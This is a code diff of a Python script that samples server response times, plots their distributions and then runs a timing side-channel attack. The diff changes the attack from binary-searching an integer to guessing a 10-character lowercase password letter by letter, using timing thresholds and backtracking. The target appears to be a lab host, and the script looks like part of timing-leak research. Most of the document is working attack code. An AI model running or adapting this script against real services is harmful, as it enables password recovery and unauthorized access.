@@ -32,6 +32,8 @@ import matplotlib
 matplotlib.use('Agg')
 import matplotlib.pyplot as plt
 import numpy as np
+import operator
+import decimal
 
 
 def establish_data():
@@ -107,7 +109,7 @@ def single_sample(s_data_, remote_host, remote_port, sample, request, display=Tr
     # Check for sample error (attacker and or benign) on timer and client
     if "Sample Error" not in [attacker_response,
                               data_in_2["Sample_Status"]]:
-        return {"Data": data_in_2["Data"]}
+        return {"Response": attacker_response["response"], "Data": data_in_2["Data"]}
     else:
         return "Error"
 
@@ -120,8 +122,8 @@ def collect_data(remote_host, remote_port, samples, s_data_):
         print("Sample:", sample, "of", samples)
         sys.stdout.flush()
 
-        request_1 = "1233 2"
-        request_2 = "1235 2"
+        request_1 = "a"
+        request_2 = "z"
         result_1 = single_sample(s_data_, remote_host, remote_port, sample, request_1)
         result_2 = single_sample(s_data_, remote_host, remote_port, sample, request_2)
 
@@ -141,54 +143,100 @@ def collect_data(remote_host, remote_port, samples, s_data_):
     return data_list
 
 
-def launch_attack(remote_host, remote_port, attack_input, s_data_):
-    my_min = 0
-    my_max = 2 ** 31 - 1
-    operations = 0
+# Calculate the threshold value for char n
+def calc_threshold(n, delta, sigma, attack_input):
+    if n == 1:
+        u1 = attack_input["u_1"]
+        s1 = attack_input["s_1"]
+    else:
+        u1 = (n - 1) * delta
+        s1 = ((n - 1) * (sigma ** 2)).sqrt()
+    u2 = n * delta
+    s2 = (n * (sigma ** 2)).sqrt()
+    return min(u1, u2) + (max(u1, u2) - min(u1, u2)) / 2
 
-    def proceed(m_min, m_max, m_operations):
-        if m_operations > 100:
+
+def launch_attack(remote_host, remote_port, attack_input, s_data_):
+    alphabet = list("abcdefghijklmnopqrstuvwxyz")
+    delta = attack_input["u_2"] - attack_input["u_1"]
+    sigma = attack_input["s_2"]
+    max_ops = 300
+    operations = 0
+    guess = ""
+    M = 10
+    sample_history = {}
+
+    def proceed(m_operations):
+        if m_operations > max_ops:
             print("Exceeded Operational Budget")
             return False
-        return (m_max - m_min) > 1
+        return True
 
     # Start exploit
-    while proceed(my_min, my_max, operations):
-        print("Min:", my_min, "Max:", my_max)
+    while proceed(operations):
+        print("Guess:", guess)
         sample = 1
         sys.stdout.flush()
 
-        mid = my_min + round((my_max - my_min) / 2)
-        request_l = str(my_min) + " 2"
-        request_m = str(mid) + " 2"
-        request_r = str(my_max) + " 2"
-        result_l = single_sample(s_data_, remote_host, remote_port, sample, request_l, False)
-        result_m = single_sample(s_data_, remote_host, remote_port, sample, request_m, False)
-        result_r = single_sample(s_data_, remote_host, remote_port, sample, request_r, False)
-        operations += 3
+        # Current guess chars
+        n = len(guess) + 1
 
-        if "Error" in [result_l, result_m, result_r]:
-            print("\t\tProcess Error Re-running ...")
-            sys.stdout.flush()
-            continue
+        # Intersection t_n and t_n-1
+        th_n = calc_threshold(n, delta, sigma, attack_input)
+        print("\tTh:", th_n)
 
-        time_l = result_l["Data"]
-        time_m = result_m["Data"]
-        time_r = result_r["Data"]
-        delta_l = time_m - time_l
-        delta_r = time_r - time_m
-        print("\tNum Ops:", operations, "Threshold:", attack_input, "L:", delta_l, "R:", delta_r)
-        if delta_l < attack_input and delta_r < attack_input:
-            continue
+        # Sample chars in alphabet
+        chosen_chars = []
 
-        if delta_l > delta_r:
-            my_max = mid
+        for char in alphabet:
+            operations += 1
+
+            # Send sample
+            request = guess + char
+            result = single_sample(s_data_, remote_host, remote_port, sample, request, False)
+            response = result["Response"]
+            response_time = result["Data"]
+            print("\tOps:", operations, "Req:", request, "Resp:", response, "t:", response_time)
+
+            # If we are on the last character
+            if n == M:
+                # If we guess correct then exit loop
+                if response == "Correct":
+                    chosen_chars.append((char, response_time))
+                    break
+            else:
+                # Track previous samples
+                if request in sample_history:
+                    sample_history[request].append(response_time)
+                else:
+                    sample_history[request] = [response_time]
+
+                # User previous history
+                mean_time = np.mean(sample_history[request])
+
+                # If threshold is exceeded the exit loop
+                if mean_time >= th_n:
+                    chosen_chars.append((char, mean_time))
+            if operations >= max_ops:
+                break
+
+        # Check if any chars were chosen
+        if len(chosen_chars) > 0:
+            chosen_chars.sort(key=operator.itemgetter(1), reverse=True)
+            chosen_char = chosen_chars[0][0]
+            guess = guess + chosen_char
+            # We have the password and are done
+            if n == M:
+                break
+        # No chars were chosen so back up
         else:
-            my_min = mid
+            # Back up 1 char and try again
+            if len(guess) > 0:
+                guess = guess[:-1]
 
     print("Complete")
     sys.stdout.flush()
-    return {"Num Ops": operations, "Range": [my_min, my_max]}
+    return {"Num Ops": operations, "Password": guess}
 
 
 def setup_data():
@@ -216,12 +264,14 @@ def process_results(data_filename, figname, display=False):
     set_1 = data_list[1]
     set_2 = data_list[2]
 
-    mean_1 = np.mean(set_1)
-    mean_2 = np.mean(set_2)
-    decision_threshold = (max(mean_1, mean_2) - min(mean_1, mean_2)) / 2
+    mean_1 = decimal.Decimal(np.mean(set_1))
+    std_1 = decimal.Decimal(np.std(set_1))
+    mean_2 = decimal.Decimal(np.mean(set_2))
+    std_2 = decimal.Decimal(np.std(set_2))
 
     plot_data(data_list, figname, display)
-    return decision_threshold
+    return {"u_1": mean_1, "s_1": std_1,
+            "u_2": mean_2, "s_2": std_2}
 
 
 def plot_data(data_list, figname, display):
@@ -235,10 +285,10 @@ def plot_data(data_list, figname, display):
 
         return [x, y]
 
-    a = 0
-    b = 500
-    n = 1
-    max_y = 10
+    a = 9.75
+    b = 11
+    n = 50
+    max_y = 600
     fs = 12
 
     set_1 = data_list[1]
@@ -252,8 +302,8 @@ def plot_data(data_list, figname, display):
     fig = plt.figure()
     plt.plot(set_1_H[0], set_1_H[1], color="b")
     plt.plot(set_2_H[0], set_2_H[1], color="r")
-    plt.plot([mean_1, mean_1], [0, max_y], "--", color="black")
-    plt.plot([mean_2, mean_2], [0, max_y], "--", color="black")
+    plt.plot([mean_1, mean_1], [0, max_y], "--", color="black", linewidth=0.5)
+    plt.plot([mean_2, mean_2], [0, max_y], "--", color="black", linewidth=0.5)
     plt.xlabel("Response Time (ms)", fontsize=fs)
     plt.ylabel("Number of Samples", fontsize=fs)
     plt.ylim([0, max_y])
@@ -279,18 +329,20 @@ def save_results(filename, results_data):
 
 
 def main():
+    # Set decimal precision
+    decimal.getcontext().prec = 20
     remote_host = 'serverNuc'
     remote_port = 8000
-    data_filename = "Category 3"
-    figname = "Category 3"
+    data_filename = "Category 14 NV"
+    figname = "Category 14 NV"
 
     print("Starting Sampling Host:", remote_host, ":", remote_port)
     sys.stdout.flush()
-    samples = 10
+    samples = 1000
     s_data_ = setup_data()
     results = collect_data(remote_host, remote_port, samples, s_data_)
     save_results(data_filename, results)
-    process_output = process_results(data_filename, figname)
+    process_output = process_results(data_filename, figname, True)
     print("Decision Threshold:", process_output)
     attack_output = launch_attack(remote_host, remote_port, process_output, s_data_)
     print("Result:", attack_output)
